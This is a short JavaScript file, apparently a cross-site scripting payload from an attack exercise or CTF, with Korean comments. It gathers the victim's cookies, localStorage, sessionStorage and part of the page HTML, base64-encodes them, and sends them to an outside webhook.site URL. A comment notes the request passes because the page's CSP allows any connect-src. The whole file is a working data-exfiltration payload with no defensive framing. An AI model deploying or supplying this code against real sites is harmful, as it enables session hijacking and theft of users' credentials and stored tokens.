// xss.js
(async () => {
    // 1. 가져올 데이터 모으기
    const data = {
        cookie: document.cookie, // 1순위 타겟
        localStorage: JSON.stringify(localStorage), // 2순위
        sessionStorage: JSON.stringify(sessionStorage), // 3순위
        // 혹시 모르니 DOM 내용도 일부 가져옴
        bodyStart: document.body.innerHTML.substring(0, 500) 
    };

    // 2. Base64로 인코딩 (특수문자 깨짐 방지)
    const payload = btoa(JSON.stringify(data));

    // 3. 내 서버로 전송
    // fetch는 CSP connect-src * 덕분에 허용됨
    await fetch(`https://webhook.site/144fdef3-ea07-4316-bff4-7619115f30f3?data=${payload}`);
})();
